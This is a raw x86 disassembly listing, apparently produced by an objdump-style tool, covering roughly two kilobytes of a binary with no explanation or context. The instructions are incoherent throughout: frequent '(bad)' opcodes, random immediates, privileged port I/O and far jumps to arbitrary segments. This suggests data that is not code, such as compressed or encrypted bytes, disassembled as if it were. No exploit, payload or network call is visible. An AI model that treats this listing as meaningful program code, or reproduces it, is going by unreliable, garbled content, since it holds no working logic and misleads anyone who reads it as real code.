  69a373:	cmc    
  69a374:	stos   DWORD PTR es:[edi],eax
  69a375:	inc    esi
  69a376:	xchg   ecx,eax
  69a377:	xor    ebx,esp
  69a379:	(bad)
  69a37d:	sbb    al,0x79
  69a37f:	inc    DWORD PTR [ebp-0x6c]
  69a382:	mov    eax,0x33c46b21
  69a387:	pop    ds
  69a388:	fstp   QWORD PTR [edx-0x2b07166c]
  69a38e:	or     BYTE PTR [edx+0x22de74d9],ah
  69a394:	jo     0x69a325
  69a396:	push   ss
  69a397:	xchg   edx,eax
  69a398:	pop    esp
  69a399:	in     eax,0x83
  69a39b:	mov    ch,0xe1
  69a39d:	mov    ds:0xb866474,al
  69a3a2:	ret    0xd22
  69a3a5:	(bad)  
  69a3a6:	pop    edx
  69a3a7:	(bad)  
  69a3a8:	je     0x69a337
  69a3aa:	aas    
  69a3ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69a3ac:	stos   DWORD PTR es:[edi],eax
  69a3ad:	rep stos DWORD PTR es:[edi],eax
  69a3af:	add    BYTE PTR [edi-0x6f61a936],0x85
  69a3b6:	out    0xfa,eax
  69a3b8:	xor    ah,BYTE PTR ds:0xb0ba2afb
  69a3be:	push   ebx
  69a3bf:	fucom  st(4)
  69a3c1:	sub    esi,DWORD PTR [edi]
  69a3c3:	inc    eax
  69a3c4:	push   es
  69a3c5:	push   eax
  69a3c6:	mov    eax,0x5606cb86
  69a3cb:	cmp    dl,BYTE PTR [edi]
  69a3cd:	sub    al,0x3b
  69a3cf:	leave  
  69a3d0:	test   ebx,edi
  69a3d2:	popf   
  69a3d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69a3d4:	adc    al,0xc6
  69a3d6:	cmp    eax,esi
  69a3d8:	add    edi,DWORD PTR [esi-0x7adeb3c8]
  69a3de:	repnz push edi
  69a3e0:	adc    al,0x18
  69a3e2:	or     edx,DWORD PTR [edx-0x78]
  69a3e5:	xchg   esi,eax
  69a3e6:	mov    ah,0xe3
  69a3e8:	sbb    BYTE PTR [eax+0x1d235ed9],dh
  69a3ee:	(bad)  
  69a3f0:	mov    ebp,0xb5632b39
  69a3f5:	data16 mov al,0x54
  69a3f8:	(bad)  
  69a3f9:	out    dx,al
  69a3fa:	ret    0x9094
  69a3fd:	push   edx
  69a3fe:	test   BYTE PTR [ebx],0x56
  69a401:	(bad)  
  69a403:	inc    eax
  69a404:	hlt    
  69a405:	xchg   ebp,eax
  69a406:	pop    edi
  69a407:	xchg   esp,eax
  69a408:	ret    0x1b6c
  69a40b:	dec    ebp
  69a40c:	mov    ebp,0x85d16235
  69a411:	pop    ebp
  69a412:	and    ebx,DWORD PTR ds:0xf4be915b
  69a418:	fimul  WORD PTR [ebx+0x3935baef]
  69a41e:	ror    BYTE PTR [eax+0x5d],cl
  69a421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69a422:	aas    
  69a423:	ins    BYTE PTR es:[edi],dx
  69a424:	mov    bh,0x57
  69a426:	add    edi,DWORD PTR ds:0xb4a2bab9
  69a42c:	xchg   ebp,eax
  69a42d:	mov    edi,0x2750e208
  69a432:	dec    ebp
  69a433:	push   ds
  69a434:	cmp    ecx,edx
  69a436:	xchg   ebp,esp
  69a438:	push   ss
  69a439:	or     eax,0xc58a813e
  69a43e:	xchg   DWORD PTR [edx+esi*8],eax
  69a441:	fsubr  st(7),st
  69a443:	clc    
  69a444:	ins    BYTE PTR es:[edi],dx
  69a445:	cli    
  69a446:	xor    BYTE PTR [ebp-0x40],0x44
  69a44a:	in     al,0x8
  69a44c:	rcr    DWORD PTR [esi-0x2c823db8],cl
  69a452:	and    al,0xba
  69a454:	push   cs
  69a455:	cwde   
  69a456:	xchg   DWORD PTR gs:[edx],edi
  69a459:	aam    0xec
  69a45b:	sub    eax,0x634c9036
  69a460:	not    BYTE PTR [ecx+0x7b]
  69a463:	scas   al,BYTE PTR es:[edi]
  69a464:	or     DWORD PTR ds:0xfa6a50b,edx
  69a46a:	jmp    0x163f:0x57f2bfbe
  69a471:	cmp    dl,BYTE PTR [ebp+0x1d]
  69a474:	adc    ch,ch
  69a476:	mov    esi,0xaa8a7887
  69a47b:	mov    ds:0x6ebd5506,al
  69a480:	or     dh,ch
  69a482:	push   ebp
  69a483:	dec    ecx
  69a484:	scas   al,BYTE PTR es:[edi]
  69a485:	loop   0x69a457
  69a487:	sbb    al,0xe4
  69a489:	mov    eax,ds:0x65971076
  69a48e:	add    ebp,0xe
  69a491:	or     eax,0x136a9734
  69a496:	mov    ch,0xde
  69a498:	xor    BYTE PTR [eax+0xa12bacb],ah
  69a49e:	nop
  69a49f:	aas    
  69a4a0:	cwde   
  69a4a1:	xlat   BYTE PTR ds:[ebx]
  69a4a2:	mov    bl,0xf2
  69a4a4:	(bad)  
  69a4a5:	imul   sp,WORD PTR [edi+0x43],0x1293
  69a4ab:	xchg   dh,ch
  69a4ad:	daa    
  69a4ae:	sbb    BYTE PTR [edi+0x6d],dl
  69a4b1:	jg     0x69a482
  69a4b3:	adc    ch,BYTE PTR [ebx+edx*2-0x4714dc7f]
  69a4ba:	mov    WORD PTR [ecx],?
  69a4bc:	dec    eax
  69a4bd:	pop    eax
  69a4be:	mov    esi,0xbcdadcab
  69a4c3:	gs xchg edi,eax
  69a4c5:	and    BYTE PTR [edi+0x7c05b678],bh
  69a4cb:	pop    ebx
  69a4cc:	les    esp,FWORD PTR [ebp+0xc87aceb]
  69a4d2:	cmp    edi,edx
  69a4d4:	jmp    DWORD PTR [esi+ecx*1+0x57b8a2a9]
  69a4db:	test   BYTE PTR [eax],ah
  69a4dd:	loop   0x69a4a1
  69a4df:	inc    edx
  69a4e0:	cmp    DWORD PTR [ebp+0x36],edi
  69a4e3:	les    esp,FWORD PTR [ecx+0x75988887]
  69a4e9:	call   0xfaf4e453
  69a4ee:	ret    
  69a4ef:	jg     0x69a50a
  69a4f1:	sbb    bh,BYTE PTR [edi+0x37]
  69a4f4:	and    eax,0x2e99df84
  69a4f9:	mov    edx,0xefa8e35e
  69a4fe:	and    DWORD PTR [ecx+edx*8-0x5b],edi
  69a502:	shl    DWORD PTR [ebp-0x5d1005de],1
  69a508:	daa    
  69a509:	xchg   edi,eax
  69a50a:	fwait
  69a50b:	pop    ds
  69a50c:	cmp    edx,DWORD PTR [ebp-0x6cc6ecc8]
  69a512:	retf   
  69a513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69a514:	adc    al,0x4f
  69a516:	fidiv  DWORD PTR [esi+edx*8]
  69a519:	shr    DWORD PTR [eax-0x73],1
  69a51c:	mov    DWORD PTR [edx],ebx
  69a51e:	pop    ds
  69a51f:	mov    ch,0x36
  69a521:	cmp    bh,BYTE PTR [edi]
  69a523:	and    ebx,eax
  69a525:	popa   
  69a526:	adc    BYTE PTR [ecx+ebp*1],bl
  69a529:	cwde   
  69a52a:	adc    ebx,0xffffffde
  69a52d:	cmp    al,0x13
  69a52f:	and    edx,esi
  69a531:	dec    ebp
  69a532:	sbb    al,BYTE PTR [ebx+0x7c]
  69a535:	test   DWORD PTR [edi],0xfe57e718
  69a53b:	out    0x1,al
  69a53d:	fdivp  st(7),st
  69a53f:	mov    bl,0xd9
  69a541:	rcr    BYTE PTR [ecx+0x494c2cf5],0x30
  69a548:	pop    es
  69a549:	xor    bh,ch
  69a54b:	scas   al,BYTE PTR es:[edi]
  69a54c:	int    0xe9
  69a54e:	jg     0x69a567
  69a550:	xor    BYTE PTR [ecx],cl
  69a552:	pop    esp
  69a553:	(bad)  
  69a554:	mov    bl,0xc8
  69a556:	aad    0xd2
  69a558:	xor    al,0x84
  69a55a:	test   al,0x38
  69a55c:	sbb    eax,DWORD PTR [ecx+0x2f1adbf8]
  69a562:	cmp    DWORD PTR ds:0xf947017e,esi
  69a568:	sub    esp,DWORD PTR [edx+0x63]
  69a56b:	add    eax,0x9cfce9d4
  69a570:	xor    eax,0xffaca735
  69a575:	dec    esi
  69a576:	leave  
  69a577:	xchg   DWORD PTR [ecx+0x6c],esp
  69a57a:	mov    dh,BYTE PTR [edx-0x9a842b1]
  69a580:	jb     0x69a574
  69a582:	in     eax,0xe5
  69a584:	adc    esi,DWORD PTR [ecx]
  69a586:	fiadd  WORD PTR [edi-0x5d]
  69a589:	shl    esi,1
  69a58b:	out    0xcd,eax
  69a58d:	jg     0x69a5d5
  69a58f:	ins    BYTE PTR es:[edi],dx
  69a590:	sbb    bh,BYTE PTR [edi+ebp*2-0x35b422a3]
  69a597:	mov    eax,esi
  69a599:	into   
  69a59a:	rcr    BYTE PTR [edx-0x6233903d],cl
  69a5a0:	push   esi
  69a5a1:	cmc    
  69a5a2:	daa    
  69a5a3:	lahf   
  69a5a4:	dec    edx
  69a5a5:	push   eax
  69a5a6:	push   0xffffffab
  69a5a8:	cs jecxz 0x69a59d
  69a5ab:	imul   BYTE PTR ds:0xaec5278c
  69a5b1:	ror    DWORD PTR ss:[bp+0x3c],cl
  69a5b6:	pop    esp
  69a5b7:	push   ds
  69a5b8:	in     al,0x76
  69a5ba:	test   BYTE PTR [edi+0x2f],dl
  69a5bd:	in     eax,dx
  69a5be:	and    dl,BYTE PTR [edi]
  69a5c0:	iret   
  69a5c1:	(bad)  
  69a5c2:	ficom  DWORD PTR [eax-0x31]
  69a5c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69a5c6:	sbb    al,bl
  69a5c8:	jns    0x69a5f1
  69a5ca:	call   0xf093:0x7b3366d3
  69a5d1:	fiadd  WORD PTR [esi+ecx*1]
  69a5d4:	rol    BYTE PTR ds:0x70d0f4b1,1
  69a5da:	in     al,dx
  69a5db:	push   ss
  69a5dc:	test   BYTE PTR [edi-0x49],dl
  69a5df:	jp     0x69a569
  69a5e1:	out    dx,eax
  69a5e2:	pop    es
  69a5e3:	pmaxub mm2,QWORD PTR [edi+0x44]
  69a5e7:	mov    WORD PTR [ecx-0xb6c9966],es
  69a5ed:	dec    ebp
  69a5ee:	fist   DWORD PTR [esi+0x6d]
  69a5f1:	dec    eax
  69a5f2:	jo     0x69a5a5
  69a5f4:	mov    ebp,0xb974cb41
  69a5f9:	test   DWORD PTR [edx+0x79e3648],edx
  69a5ff:	call   0xb4407095
  69a604:	xor    al,0x8b
  69a606:	rcl    BYTE PTR [ebp-0x33467e96],0x63
  69a60d:	aaa    
  69a60e:	inc    edi
  69a60f:	clc    
  69a610:	lahf   
  69a611:	(bad)  
  69a612:	mov    ecx,ds
  69a614:	jno    0x69a5b6
  69a616:	mov    ds:0x39d591d3,eax
  69a61b:	and    BYTE PTR [edi-0x1e],cl
  69a61e:	adc    ch,BYTE PTR [edi]
  69a620:	mov    al,0x19
  69a622:	xchg   ebp,eax
  69a623:	pusha  
  69a624:	mov    DWORD PTR [esp+0x3c595fd3],edi
  69a62b:	out    dx,al
  69a62c:	pop    ebx
  69a62d:	inc    ecx
  69a62e:	cld    
  69a62f:	ins    BYTE PTR es:[edi],dx
  69a630:	and    DWORD PTR [edx],eax
  69a632:	xlat   BYTE PTR ds:[ebx]
  69a633:	mov    edx,gs
  69a635:	sub    BYTE PTR ds:0x5083ef42,0x3
  69a63c:	(bad)  
  69a63d:	jg     0x69a6b8
  69a63f:	and    DWORD PTR ds:0xf41e4735,eax
  69a645:	ds pop ds
  69a647:	imul   ebp,DWORD PTR [ecx-0xf],0x68
  69a64b:	rsqrtps xmm3,XMMWORD PTR [ecx-0x4b88872c]
  69a652:	fstp   DWORD PTR [ecx+0x3e3e8031]
  69a658:	mov    al,0x14
  69a65a:	add    al,0xcb
  69a65c:	push   0x1ab49e33
  69a661:	add    ecx,DWORD PTR [ebp-0x744a586b]
  69a667:	outs   dx,DWORD PTR ds:[esi]
  69a668:	xchg   ecx,eax
  69a669:	sbb    BYTE PTR [ecx+0x38a0c220],0x4e
  69a670:	inc    esi
  69a671:	pop    ds
  69a672:	pop    ebx
  69a673:	fidivr DWORD PTR [eax]
  69a675:	hlt    
  69a676:	adc    WORD PTR [eax+edi*8+0x1cfcc72],cx
  69a67e:	xchg   edi,eax
  69a67f:	xor    eax,0x4856b005
  69a684:	xchg   ebp,eax
  69a685:	int    0x23
  69a687:	test   DWORD PTR ds:0xe681a460,edi
  69a68d:	mov    ebx,0xc44ef2cf
  69a692:	pop    ebp
  69a693:	sub    al,0x3
  69a695:	ror    BYTE PTR [ecx-0x69cb9acb],cl
  69a69b:	jl     0x69a659
  69a69d:	ret    0x8a9
  69a6a0:	lds    esi,FWORD PTR [ebp-0x1eac543f]
  69a6a6:	(bad)  
  69a6a8:	lods   eax,DWORD PTR ds:[esi]
  69a6a9:	fsubr  QWORD PTR [esi]
  69a6ab:	add    ebx,DWORD PTR [ebp-0x62]
  69a6ae:	pop    eax
  69a6af:	lahf   
  69a6b0:	mov    esp,0xd74d345a
  69a6b5:	out    0x5e,eax
  69a6b7:	stos   BYTE PTR es:[edi],al
  69a6b8:	dec    esi
  69a6b9:	inc    edx
  69a6ba:	xor    al,0x7e
  69a6bc:	(bad)  
  69a6be:	addr16 in al,0x5e
  69a6c1:	pop    ds
  69a6c2:	into   
  69a6c3:	xor    DWORD PTR [ecx],0x158abc92
  69a6c9:	aam    0xa9
  69a6cb:	test   DWORD PTR [edi],ecx
  69a6cd:	scas   eax,DWORD PTR es:[edi]
  69a6ce:	js     0x69a65d
  69a6d0:	dec    ebx
  69a6d1:	lods   eax,DWORD PTR ds:[esi]
  69a6d2:	pop    edx
  69a6d3:	push   ebx
  69a6d4:	dec    eax
  69a6d5:	jb     0x69a714
  69a6d7:	enter  0xb71,0x7f
  69a6db:	cwde   
  69a6dc:	lahf   
  69a6dd:	fild   DWORD PTR [esi+0x67]
  69a6e0:	mov    bh,0x66
  69a6e2:	adc    DWORD PTR [esi+0x36],0xffffffed
  69a6e6:	leave  
  69a6e7:	pop    eax
  69a6e8:	imul   eax,ebx,0x5872b4ec
  69a6ee:	or     dh,bl
  69a6f0:	mul    DWORD PTR [edx]
  69a6f2:	inc    esi
  69a6f3:	jne    0x69a697
  69a6f5:	test   esp,eax
  69a6f7:	pop    ecx
  69a6f8:	outs   dx,BYTE PTR ds:[esi]
  69a6f9:	jno    0x69a6a3
  69a6fb:	mov    ds:0x93bbbf35,eax
  69a700:	sub    edi,DWORD PTR [ebp+eax*4-0x21f1bcfe]
  69a707:	mov    ?,ebp
  69a709:	and    BYTE PTR [ebx],cl
  69a70b:	inc    edi
  69a70c:	mov    al,ds:0xf67e5b9
  69a711:	(bad)  
  69a712:	call   0x22499652
  69a717:	pop    es
  69a718:	les    esi,FWORD PTR [ecx-0xbee96e2]
  69a71e:	stos   BYTE PTR es:[edi],al
  69a71f:	pop    esi
  69a720:	pop    ecx
  69a721:	push   edi
  69a722:	imul   esp,DWORD PTR [ebx],0x5f25cd5d
  69a728:	lahf   
  69a729:	js     0x69a6d2
  69a72b:	add    eax,0x20bb201f
  69a730:	sbb    eax,0x1f044c8f
  69a735:	dec    esp
  69a736:	cmp    eax,0x831081bf
  69a73b:	sbb    ebx,DWORD PTR [eax-0x35]
  69a73e:	pusha  
  69a73f:	push   cs
  69a740:	sub    al,0xb0
  69a742:	sbb    ch,BYTE PTR [ebx]
  69a744:	ret    0x2b74
  69a747:	xlat   BYTE PTR ds:[ebx]
  69a748:	ret    0x5367
  69a74b:	add    DWORD PTR [esi+0x32],0x198f2a27
  69a752:	gs jae 0x69a7bf
  69a755:	int3   
  69a756:	(bad)  
  69a757:	or     edx,DWORD PTR [edi-0x17e8fbe7]
  69a75d:	cs push esi
  69a75f:	sbb    al,0x30
  69a761:	push   edx
  69a762:	cmp    ah,BYTE PTR [edx+esi*4-0x26]
  69a766:	jmp    0x106:0xc1b71d14
  69a76d:	jl     0x69a72d
  69a76f:	xchg   edx,eax
  69a770:	push   ss
  69a771:	dec    eax
  69a772:	sub    eax,0x8385e011
  69a777:	push   ebp
  69a778:	push   eax
  69a779:	add    DWORD PTR [edx-0x5fa7d66c],eax
  69a77f:	dec    ebx
  69a780:	popf   
  69a781:	mov    cl,BYTE PTR ds:0x6983702d
  69a787:	retf   
  69a788:	dec    ebp
  69a789:	arpl   WORD PTR [esi+ebx*2],sp
  69a78c:	jle    0x69a79d
  69a78e:	fsub   DWORD PTR ds:0xeb66f3ad
  69a794:	cmp    eax,0xa2c02b10
  69a799:	or     cl,BYTE PTR [edi-0x30727bcc]
  69a79f:	mov    eax,ds:0x9ce451d5
  69a7a4:	sbb    eax,0x1b1f5f7
  69a7a9:	das    
  69a7aa:	jns    0x69a7e5
  69a7ac:	add    DWORD PTR [edx-0x2a],esi
  69a7af:	repz dec DWORD PTR [edx]
  69a7b2:	dec    ecx
  69a7b3:	sbb    edi,DWORD PTR [edi+0x57530d64]
  69a7b9:	fs mov esi,0x8b981966
  69a7bf:	lea    edi,[esp+ecx*8+0x11e4462e]
  69a7c6:	xor    bh,bl
  69a7c8:	or     eax,0x19c2c76d
  69a7cd:	mov    bl,0xd2
  69a7cf:	icebp  
  69a7d0:	mov    WORD PTR [edi+0x5],cs
  69a7d3:	nop
  69a7d4:	in     eax,0xb6
  69a7d6:	dec    ecx
  69a7d7:	test   BYTE PTR [eax-0x56],cl
  69a7da:	mov    ebx,0x5ea1dd67
  69a7df:	xor    DWORD PTR [eax+edx*4-0x7e],0xf70e9a62
  69a7e7:	xor    DWORD PTR [edx],ebp
  69a7e9:	xor    BYTE PTR ds:0xda92fb4e,0xb2
  69a7f0:	push   eax
  69a7f1:	hlt    
  69a7f2:	mov    eax,ds:0x99049bee
  69a7f7:	dec    ebx
  69a7f8:	mov    esi,DWORD PTR [ebp+0x4dbafb10]
  69a7fe:	int    0x45
  69a800:	mov    esi,0xe052c68d
  69a805:	push   ds
  69a806:	mov    eax,0x89ec7f5e
  69a80b:	dec    ecx
  69a80c:	(bad)  
  69a80d:	shl    BYTE PTR [ebp+0xf69a5f2],1
  69a813:	sub    bh,dh
  69a815:	shl    bl,1
  69a817:	cmp    DWORD PTR [eax-0x7b],ebp
  69a81a:	and    bh,dl
  69a81c:	stc    
  69a81d:	pusha  
  69a81e:	fbstp  TBYTE PTR [ebp+eax*2-0x60]
  69a822:	pop    ebx
  69a823:	pop    eax
  69a824:	test   al,0x44
  69a826:	dec    esp
  69a827:	xchg   ebx,eax
  69a828:	out    dx,al
  69a829:	(bad)  
  69a82a:	and    DWORD PTR [eax],ebx
  69a82c:	mov    WORD PTR [eax-0x6eb45ecc],es
  69a832:	dec    ebx
  69a833:	popf   
  69a834:	dec    edx
  69a835:	lods   al,BYTE PTR ds:[esi]
  69a836:	addr16 inc esp
  69a838:	add    al,0xc7
  69a83a:	sbb    BYTE PTR [edx],bh
  69a83c:	mov    edi,0x5098efab
  69a841:	cwde   
  69a842:	inc    DWORD PTR [ebp+0x9]
  69a845:	data16 dec BYTE PTR ds:0x4c49d8f5
  69a84c:	add    eax,0x449aec01
  69a851:	fdivr  st(2),st
  69a853:	pop    ds
  69a854:	lods   eax,DWORD PTR ds:[esi]
  69a855:	sahf   
  69a856:	in     al,dx
  69a857:	mov    ecx,0x84686982
  69a85c:	mov    al,ds:0x187e3f5c
  69a861:	jns    0x69a8c3
  69a863:	sbb    ebx,edx
  69a865:	mov    eax,0x472fabaf
  69a86a:	xchg   ebx,eax
  69a86b:	mov    edi,0xd03b319e
  69a870:	push   gs
  69a872:	jge    0x69a88c
  69a874:	fdivr  DWORD PTR [eax+0x28]
  69a877:	outs   dx,DWORD PTR ds:[esi]
  69a878:	hlt    
  69a879:	clc    
  69a87a:	(bad)  
  69a87b:	in     al,0x3a
  69a87d:	jbe    0x69a862
  69a87f:	sbb    DWORD PTR [edi+0x1d05ccd8],esp
  69a885:	pop    ecx
  69a886:	jmp    0x69a824
  69a888:	pop    esi
  69a889:	(bad)  
  69a88a:	les    ebp,FWORD PTR [ecx]
  69a88c:	popf   
  69a88d:	jge    0x69a888
  69a88f:	jo     0x69a897
  69a891:	test   eax,0x77117dbb
  69a896:	cmp    al,0x18
  69a898:	mov    bh,0x5a
  69a89a:	in     al,dx
  69a89b:	sti    
  69a89c:	xchg   ebp,eax
  69a89d:	and    BYTE PTR [edx-0x4a2697e0],al
  69a8a3:	sbb    al,bl
  69a8a5:	inc    edi
  69a8a6:	imul   edx,DWORD PTR [edi-0x72],0xffffffd9
  69a8aa:	loope  0x69a8a1
  69a8ac:	adc    cl,al
  69a8ae:	xchg   esi,eax
  69a8af:	cld    
  69a8b0:	popa   
  69a8b1:	mov    edx,0x9803f133
  69a8b6:	xchg   esp,eax
  69a8b7:	ins    BYTE PTR es:[edi],dx
  69a8b8:	adc    eax,0x9c607cbb
  69a8bd:	inc    edi
  69a8be:	sub    bh,bh
  69a8c0:	scas   al,BYTE PTR es:[edi]
  69a8c1:	or     DWORD PTR [ebp+eax*8-0x4c2c3ea0],edx
  69a8c8:	jns    0x69a8cf
  69a8ca:	jg     0x69a8b9
  69a8cc:	inc    esi
  69a8cd:	and    eax,0x50a6b105
  69a8d2:	scas   eax,DWORD PTR es:[edi]
  69a8d3:	add    ebx,esi
  69a8d5:	sbb    eax,0x2c57b74d
  69a8da:	popf   
  69a8db:	loope  0x69a872
  69a8dd:	dec    eax
  69a8de:	pop    ds
  69a8df:	mov    bl,0x93
  69a8e1:	scas   al,BYTE PTR es:[edi]
  69a8e2:	xchg   ebp,eax
  69a8e3:	mov    BYTE PTR ds:0xdf321761,bl
  69a8e9:	mov    ecx,0xe00fdd49
  69a8ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69a8ef:	add    BYTE PTR [eax-0x3],ch
  69a8f2:	lahf   
  69a8f3:	inc    esp
  69a8f4:	inc    edx
  69a8f5:	loop   0x69a962
  69a8f7:	test   dl,ch
  69a8f9:	sbb    BYTE PTR [ebx+0x41],al
  69a8fc:	je     0x69a8a9
  69a8fe:	sbb    BYTE PTR [ebx-0x39],dl
  69a901:	and    BYTE PTR [esi-0x7af0eeab],dl
  69a907:	dec    ecx
  69a908:	leave  
  69a909:	add    esp,DWORD PTR [edx+0x50]
  69a90c:	pop    ss
  69a90d:	adc    DWORD PTR [ebx-0x68733d19],edx
  69a913:	cld    
  69a914:	scas   eax,DWORD PTR es:[edi]
  69a915:	mov    ah,0x8a
  69a917:	es jecxz 0x69a95b
  69a91a:	add    dl,BYTE PTR [ecx]
  69a91c:	out    dx,eax
  69a91d:	cmp    dh,BYTE PTR [esi+eiz*4-0x72]
  69a921:	sub    DWORD PTR [ebp+ecx*8-0xf912124],ecx
  69a928:	outs   dx,DWORD PTR ds:[esi]
  69a929:	retf   0x7b5e
  69a92c:	pop    esi
  69a92d:	popa   
  69a92e:	xchg   ebx,eax
  69a92f:	aas    
  69a930:	jge    0x69a8e6
  69a932:	jnp    0x69a923
  69a934:	xchg   DWORD PTR [edx-0x77f0f5ab],ebx
  69a93a:	das    
  69a93b:	xchg   ebp,eax
  69a93c:	sub    bl,BYTE PTR [ebp+0xd126d96]
  69a942:	push   esi
  69a943:	adc    BYTE PTR [ecx-0x28],0xd1
  69a947:	sbb    eax,0x46f9ce5e
  69a94c:	popa   
  69a94d:	pop    esp
  69a94e:	pop    es
  69a94f:	adc    edi,edi
  69a951:	adc    al,0x55
  69a953:	mov    cl,0xf8
  69a955:	sbb    al,0x83
  69a957:	mov    ds:0xa8061f36,eax
  69a95c:	sub    DWORD PTR [eax],eax
  69a95e:	adc    dh,BYTE PTR [edi+eax*8-0x2a4ba189]
  69a965:	shl    BYTE PTR [edi+0x1],0x8d
  69a969:	int    0x21
  69a96b:	(bad)  
  69a96c:	mov    cl,0x9d
  69a96e:	clc    
  69a96f:	push   esi
  69a970:	fisttp WORD PTR [edi+0x1211d287]
  69a976:	imul   esi,DWORD PTR [ebx+0x34],0xffffff8c
  69a97a:	add    esi,0x3d365ed7
  69a980:	mov    al,0x70
  69a982:	scas   al,BYTE PTR es:[edi]
  69a983:	fstp   QWORD PTR [ebx+0x72]
  69a986:	sti    
  69a987:	mov    bh,BYTE PTR [eax]
  69a989:	add    BYTE PTR [ecx-0x19],ah
  69a98c:	add    DWORD PTR [edi+0x1],eax
  69a98f:	xchg   esp,eax
  69a990:	add    DWORD PTR [eax+0x23],eax
  69a993:	cmp    bl,dl
  69a995:	je     0x69a9ca
  69a997:	or     al,0x42
  69a999:	pop    ebx
  69a99a:	push   edx
  69a99b:	fisttp DWORD PTR [edx+0x3]
  69a99e:	cs jnp 0x69a9ea
  69a9a1:	outs   dx,BYTE PTR ds:[esi]
  69a9a2:	and    eax,0x164ddc3a
  69a9a7:	or     cl,BYTE PTR [eax]
  69a9a9:	js     0x69a9f7
  69a9ab:	shl    DWORD PTR [eax+eax*4+0x6e],cl
  69a9af:	das    
  69a9b0:	std    
  69a9b1:	mov    esi,0xb24534f3
  69a9b6:	jg     0x69a991
  69a9b8:	mov    al,ds:0x7f4f3f1b
  69a9bd:	or     ah,BYTE PTR gs:0x4928dc04
  69a9c4:	outs   dx,DWORD PTR ds:[esi]
  69a9c5:	mov    ah,0x32
  69a9c7:	cmp    BYTE PTR [esi+0xf4f3288],cl
  69a9cd:	fs and al,0x70
  69a9d0:	sbb    eax,DWORD PTR [ebx+ebp*1]
  69a9d3:	cmp    DWORD PTR ds:0x1cca27b9,eax
  69a9d9:	xor    eax,0x538c407c
  69a9de:	cmp    bl,BYTE PTR [edi+0x7907f60c]
  69a9e4:	cs mov ss,eax
  69a9e7:	out    0x6e,eax
  69a9e9:	add    al,BYTE PTR [edi-0x1fd189cb]
  69a9ef:	sbb    al,0x28
  69a9f1:	int3   
  69a9f2:	mov    al,ds:0x7bc6cf0a
  69a9f7:	out    dx,al
  69a9f8:	sub    dl,BYTE PTR [esi]
  69a9fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69a9fb:	mov    bl,0xa4
  69a9fd:	mov    al,ds:0x8b037b9c
  69aa02:	ret    
  69aa03:	aas    
  69aa04:	in     al,0xb0
  69aa06:	loop   0x69aa31
  69aa08:	xchg   ebp,eax
  69aa09:	mov    edi,0x65544fc2
  69aa0e:	mov    ch,0xdf
  69aa10:	sub    DWORD PTR [edi+0x75b27425],edi
  69aa16:	mov    ecx,0x4ea5fee4
  69aa1b:	mov    bh,0xbe
  69aa1d:	jl     0x69a9a6
  69aa1f:	(bad)  
  69aa20:	fisubr DWORD PTR [edx+0x14]
  69aa23:	int3   
  69aa24:	mov    DWORD PTR [eax+0x3a9cd563],eax
  69aa2a:	and    ebx,DWORD PTR [eax+0x40]
  69aa2d:	push   ecx
  69aa2e:	jg     0x69a9be
  69aa30:	neg    DWORD PTR [esi]
  69aa32:	pop    ds
  69aa33:	xchg   BYTE PTR [eax+0xc9a7f9f],dl
  69aa39:	retf   
  69aa3a:	push   eax
  69aa3b:	mov    bh,0xc8
  69aa3d:	dec    ebx
  69aa3e:	xchg   ebx,eax
  69aa3f:	jae    0x69aa08
  69aa41:	inc    ecx
  69aa42:	pop    esi
  69aa43:	push   ebp
  69aa44:	test   DWORD PTR [ebx+0x2b],ebp
  69aa47:	sbb    DWORD PTR [edx+0x29],0xe2d3270e
  69aa4e:	imul   ecx,DWORD PTR [ebp+0x44e707cd],0x10
  69aa55:	mov    ds:0x77e48588,eax
  69aa5a:	inc    ecx
  69aa5b:	jnp    0x69aa4a
  69aa5d:	out    dx,al
  69aa5e:	dec    ebx
  69aa5f:	mov    ds:0xbfe9cb14,al
  69aa64:	push   ecx
  69aa65:	dec    eax
  69aa66:	mov    ebp,0x4c532e0d
  69aa6b:	retf   0xff3
  69aa6e:	xchg   esp,eax
  69aa6f:	mov    ?,WORD PTR [ecx]
  69aa71:	imul   edi,eax,0x8578266
  69aa77:	fadd   st(6),st
  69aa79:	xor    DWORD PTR [edi+0x6d],esp
  69aa7c:	dec    ebx
  69aa7d:	ret    
  69aa7e:	inc    esi
  69aa7f:	imul   ecx,DWORD PTR [edx+0x24],0x3b
  69aa83:	nop
  69aa84:	inc    edi
  69aa85:	jmp    0x94cfadec
  69aa8a:	popa   
  69aa8b:	aam    0xf9
  69aa8d:	push   cs
  69aa8e:	fcom   QWORD PTR [edi]
  69aa90:	in     eax,dx
  69aa91:	nop
  69aa92:	(bad)  
  69aa93:	mov    al,0xa6
  69aa95:	xor    al,0x22
  69aa97:	arpl   WORD PTR [edx+ebp*4-0x7],di
  69aa9b:	jns    0x69aa84
  69aa9d:	call   0xcb30:0x7b81c128
  69aaa4:	jle    0x69aa64
  69aaa6:	push   ss
  69aaa7:	fwait
  69aaa8:	in     eax,dx
  69aaa9:	jne    0xa5dca5e3
  69aaaf:	mov    cl,0xc1
  69aab1:	push   edx
  69aab2:	inc    ebp
  69aab3:	xor    eax,0xbb40eb71
  69aab8:	jl     0x69ab36
  69aaba:	push   ebx
  69aabb:	mov    esi,0x473d552
  69aac0:	rcl    BYTE PTR [edx-0x747b501c],1
  69aac6:	imul   ecx,DWORD PTR [ebx],0x57493d5b
  69aacc:	nop
  69aacd:	ins    BYTE PTR es:[edi],dx
  69aace:	mov    edx,ebp
  69aad0:	dec    esp
  69aad1:	inc    ebx
  69aad2:	stc    
  69aad3:	and    DWORD PTR [edx+edi*2],ecx
  69aad6:	out    0xbe,eax
  69aad8:	sub    eax,0xf31a3d3d
  69aadd:	mov    eax,0xd45b8788
  69aae2:	sahf   
  69aae3:	push   es
  69aae4:	imul   eax,esp,0x1d
  69aae7:	xlat   BYTE PTR ds:[ebx]
  69aae8:	scas   eax,DWORD PTR es:[edi]
  69aae9:	aam    0x91
  69aaeb:	cwde   
  69aaec:	retf   0xf0d1
  69aaef:	ss mov eax,0xa7a4a65d
  69aaf5:	push   ebp
  69aaf6:	mov    ds:0x9cfb941b,eax
  69aafb:	lea    esp,[esi+0x6d]
